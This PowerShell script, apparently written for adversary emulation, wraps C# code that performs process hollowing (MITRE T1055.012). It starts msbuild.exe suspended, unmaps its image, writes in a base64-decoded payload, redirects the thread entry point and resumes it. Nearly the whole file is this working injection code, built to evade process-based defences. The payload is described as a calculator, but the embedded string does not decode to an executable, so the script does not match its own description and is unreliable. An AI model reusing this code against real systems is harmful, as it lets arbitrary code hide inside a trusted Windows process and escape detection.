<#
.SYNOPSIS
Adversaries may inject malicious code into suspended and hollowed processes in order to evade process-based defenses. 
Process hollowing is a "living-off-the-land" method of executing arbitrary code in the address space of a separate live process. 
https://attack.mitre.org/techniques/T1055/012/

.DESCRIPTION
Hollowing legitimate windows .NET msbuild process with a .NET calculator process
 
.EXAMPLE
Invoke-Hollow64
 
#>


$Hollow64 = @"
using System;
using System.IO;
using System.Text;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace PEHollow
{
    public sealed class Program
    {

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct ProcessInformation
        {
            public readonly IntPtr ProcessHandle;

            public readonly IntPtr ThreadHandle;

            public readonly uint ProcessId;

            private readonly uint ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct StartupInformation
        {
            public uint Size;

            private readonly string Reserved1;

            private readonly string Desktop;

            private readonly string Title;

            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
            private readonly byte[] Misc;

            private readonly IntPtr Reserved2;

            private readonly IntPtr StdInput;

            private readonly IntPtr StdOutput;

            private readonly IntPtr StdError;
        }

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandleA(string dllToLoad);

	[DllImport("kernel32.dll")]
	private static extern IntPtr LoadLibraryA(string dllName);

	[DllImport("kernel32.dll")]
	private static extern IntPtr VirtualProtect(IntPtr addr,int size,uint priv, out uint oldpriv);
        [DllImport("kernel32.dll")]
        private static extern IntPtr GetProcAddress(IntPtr hModule, string procedureName);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate bool LoadedCreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref StartupInformation startupInfo, ref ProcessInformation processInformation);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate bool LoadedGetThreadContext(IntPtr thread, int[] context);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate bool LoadedWow64GetThreadContext(IntPtr thread, int[] context);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate bool LoadedSetThreadContext(IntPtr thread, int[] context);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate bool LoadedWow64SetThreadContext(IntPtr thread, int[] context);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate bool LoadedReadProcessMemory(IntPtr process, long baseAddress, ref long buffer, int bufferSize, ref int bytesRead);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate bool LoadedWriteProcessMemory(IntPtr process, long baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);
        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int LoadedNtUnmapViewOfSection(IntPtr process, long baseAddress);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate long LoadedVirtualAllocEx(IntPtr handle, long address, int length, int type, int protect);

        [UnmanagedFunctionPointer(CallingConvention.Cdecl)]
        private delegate int LoadedResumeThread(IntPtr handle, long suspendeCount);
        [DllImport("kernel32.dll")]

        static extern uint GetLastError();

        private static long Long(int left, int right)
        {
            long resHigh = ((long)left) << 32;
            long resLow = (long)right & 0x00000000ffffffff;
            return resHigh | resLow;
        }
        public static bool Run(string path, byte[] data)
        {
            int num = 1;
            do
            {
                if (HandleRun(path, data))
                {
                    return true;
                }
                num = checked(num + 1);
            }
            while (num <= 4);
            return false;
        }

        private static bool HandleRun(string path, byte[] data)
        {
            int bytesRead = 0;
            string commandLine = "\"" + path + "  /nologo /nodemode:1 /nr \"";
            StartupInformation startupInfo = default(StartupInformation);
            ProcessInformation processInformation = default(ProcessInformation);
            startupInfo.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(StartupInformation)));
            checked
            {
                try
                {
                    IntPtr pDll = GetModuleHandleA("kernel32");

                    if (pDll == IntPtr.Zero)
                    {
                        throw new Exception();
                    }


                    IntPtr pAddressOfFunctionToCall = GetProcAddress(pDll, "CreateProcessA");
                    LoadedCreateProcess CreateProcessA = (LoadedCreateProcess)Marshal.GetDelegateForFunctionPointer(
                                                                                                pAddressOfFunctionToCall,
                                                                                                typeof(LoadedCreateProcess));
                    pAddressOfFunctionToCall = GetProcAddress(pDll, "ReadProcessMemory");
                    LoadedReadProcessMemory ReadProcessMemory = (LoadedReadProcessMemory)Marshal.GetDelegateForFunctionPointer(
                                                                                                pAddressOfFunctionToCall,
                                                                                                typeof(LoadedReadProcessMemory));
                    pAddressOfFunctionToCall = GetProcAddress(pDll, "VirtualAllocEx");
                    LoadedVirtualAllocEx VirtualAllocEx = (LoadedVirtualAllocEx)Marshal.GetDelegateForFunctionPointer(
                                                                                                pAddressOfFunctionToCall,
                                                                                                typeof(LoadedVirtualAllocEx));
                    pAddressOfFunctionToCall = GetProcAddress(pDll, "WriteProcessMemory");
                    LoadedWriteProcessMemory WriteProcessMemory = (LoadedWriteProcessMemory)Marshal.GetDelegateForFunctionPointer(
                                                                                                pAddressOfFunctionToCall,
                                                                                                typeof(LoadedWriteProcessMemory));
                    pAddressOfFunctionToCall = GetProcAddress(pDll, "GetThreadContext");
                    LoadedGetThreadContext GetThreadContext = (LoadedGetThreadContext)Marshal.GetDelegateForFunctionPointer(
                                                                                                pAddressOfFunctionToCall, typeof(LoadedGetThreadContext));

                    pAddressOfFunctionToCall = GetProcAddress(pDll, "SetThreadContext");
                    LoadedSetThreadContext SetThreadContext = (LoadedSetThreadContext)Marshal.GetDelegateForFunctionPointer(
                                                                                                pAddressOfFunctionToCall, typeof(LoadedSetThreadContext));

                    pDll = GetModuleHandleA("ntdll");
                    if (pDll == IntPtr.Zero)
                    {
                        throw new Exception();
                    }
                    pAddressOfFunctionToCall = GetProcAddress(pDll, "NtUnmapViewOfSection");
                    LoadedNtUnmapViewOfSection NtUnmapViewOfSection = (LoadedNtUnmapViewOfSection)Marshal.GetDelegateForFunctionPointer(
                                                                                                pAddressOfFunctionToCall, typeof(LoadedNtUnmapViewOfSection));

                    pAddressOfFunctionToCall = GetProcAddress(pDll, "NtResumeThread");
                    LoadedResumeThread NtResumeThread = (LoadedResumeThread)Marshal.GetDelegateForFunctionPointer(
                                                                                                pAddressOfFunctionToCall,
                                                                                                 typeof(LoadedResumeThread));


                    if (!CreateProcessA(path, commandLine, IntPtr.Zero, IntPtr.Zero, false, 4u, IntPtr.Zero, null, ref startupInfo, ref processInformation))
                    {
                        throw new Exception();
                    }
                    int lfanew = BitConverter.ToInt32(data, 60);

                    long ImageBaseSrc = BitConverter.ToInt64(data, lfanew + 26 + 22);

                    int[] context = new int[308] { 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1048587, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0 };



                    if (!GetThreadContext(processInformation.ThreadHandle, context))
                    {
                        throw new Exception();
                    }

                    long Rdx = Long(context[35], context[34]);

                    long ImageBaseTarget = 0;



                    if (!ReadProcessMemory(processInformation.ProcessHandle, Rdx + 4 + 4 + 8, ref ImageBaseTarget, 8, ref bytesRead))
                    {
                        throw new Exception();
                    }


                    if (ImageBaseSrc == ImageBaseTarget && NtUnmapViewOfSection(processInformation.ProcessHandle, ImageBaseSrc) != 0)
                    {
                        throw new Exception();
                    }
                    int SizeOfImageSrc = BitConverter.ToInt32(data, lfanew + 80);
                    int SizeOfHeadersSrc = BitConverter.ToInt32(data, lfanew + 42 + 42);
                    bool flag = false;



                    long NewBaseAddress = VirtualAllocEx(processInformation.ProcessHandle, ImageBaseSrc, SizeOfImageSrc, 12288, 64);
                    if (NewBaseAddress == 0)
                    {
                        throw new Exception();
                    }


                    if (!WriteProcessMemory(processInformation.ProcessHandle, NewBaseAddress, data, SizeOfHeadersSrc, ref bytesRead))
                    {
                        throw new Exception();
                    }
                    int pSecH = lfanew + 264;
                    short NumberOfSections = BitConverter.ToInt16(data, lfanew + 6);
                    int num7 = NumberOfSections - 1;
                    for (int i = 0; i <= num7; i++)
                    {
                        int VirtualAddressRva = BitConverter.ToInt32(data, pSecH + 12);
                        int RawSize = BitConverter.ToInt32(data, pSecH + 16);
                        int RawAddressRva = BitConverter.ToInt32(data, pSecH + 20);
                        if (RawSize != 0)
                        {
                            byte[] section = new byte[RawSize];
                            Buffer.BlockCopy(data, RawAddressRva, section, 0, section.Length);
                            if (!WriteProcessMemory(processInformation.ProcessHandle, NewBaseAddress + VirtualAddressRva, section, section.Length, ref bytesRead))
                            {
                                throw new Exception();
                            }
                        }
                        pSecH += 40;
                    }
                    byte[] bytes = BitConverter.GetBytes(NewBaseAddress);
                    if (!WriteProcessMemory(processInformation.ProcessHandle, Rdx + 8 + 8, bytes, 8, ref bytesRead))
                    {
                        throw new Exception();
                    }
                    int AddressOfEntryOffset = BitConverter.ToInt32(data, lfanew + 40);
                    if (flag)
                    {
                        NewBaseAddress = ImageBaseSrc;
                    }
                    byte[] newEntryPoint = BitConverter.GetBytes(checked((long)NewBaseAddress + AddressOfEntryOffset));
                    context[33] = BitConverter.ToInt32(newEntryPoint, 4);
                    context[32] = BitConverter.ToInt32(newEntryPoint, 0);

                    if (!SetThreadContext(processInformation.ThreadHandle, context))
                    {
                        throw new Exception();
                    }
                    if (NtResumeThread(processInformation.ThreadHandle, 0) == -1)
                    {
                        throw new Exception();
                    }
                }
                catch (Exception)
                {
                    Process processById = Process.GetProcessById(Convert.ToInt32(processInformation.ProcessId));
                    processById.Kill();
                    return false;
                }
                return true;
            }
        }

        public static void Main()
        {

			string binaryInb64Str = "BwIAAAAkAABSU0EyAAQAAAEAAQC1fii/8MpR5WWVlm8Kakos38ov4mWNnAo03veCOsKA+3GYGXErc+zo7MlCMr9U5Jx74CzxT9JC73xRwTOBr6qLk1o2UxwyqIJtG6eCH5OprcbaFitqtssE2Kpt2g9OrhQXWl5Kl8mIhyaEJket7xyeSv4i/+D95Crs+e8WkNd4vz/vUp+DdJITNg4emFMssabfRPmzvPPZPYhbwo17VjlMosx744WMWwjmgjdrLPORJtks1M8a8swS5Ztk2bBT1ekLCRGnJZpnn21EmJsC0O66LX1KNIYZB+GGQJUXSJzL0AqtCf8HxlR2m6dYlwFGI/uWSImt3J80EjXcEUWefZ/RR5id2a3TNk18jjZ1k5043iGNRXklBBQPqeAIN+BgRiRHkGZ74+DeAP5nF/kJF8qZFlWFkqcBBwlLrOedlbOMY0G/whw01ikB9gwyYqaapat1zzN3Z/PslVc4d2qCCPwoabWbiqhNyA/JTvcjhNI3cPOjgJ9EdBToawuMMdkQxp+LbXP3nn6U0uuLMilaT7YZx4wjp3Za79hntfetMGxzgOXdSgChnahletxNbK3w8LV56ZOrphX7WRdeMWAJhZODhbIVAufs2A3yGIOOZCQoqpXPIM6ZL8NH38Y6iVSrgibvduRjPFvhjfLLOHbz1ljeEYV6rkFLZcsTG4kj7Pn/lHWjHD+GJVwdcwGeLibt2QJZ10YD1XA+PoQl7O02vu0gzA9FOeZC/UW8BKfbOWG0IXWNlIGkBSOpLRakcao60Lw=";

            byte[] executable = Convert.FromBase64String(binaryInb64Str);

            Run(Environment.GetEnvironmentVariable("WINDIR") +
                @"\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe", executable);
        }
    }
}
"@



function Invoke-Hollow64 {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $false)]
        [String]$program= ''
    )
    Begin {
		Add-Type $Hollow64 
    }

    Process {
		[PEHollow.Program]::Main()
    }

}


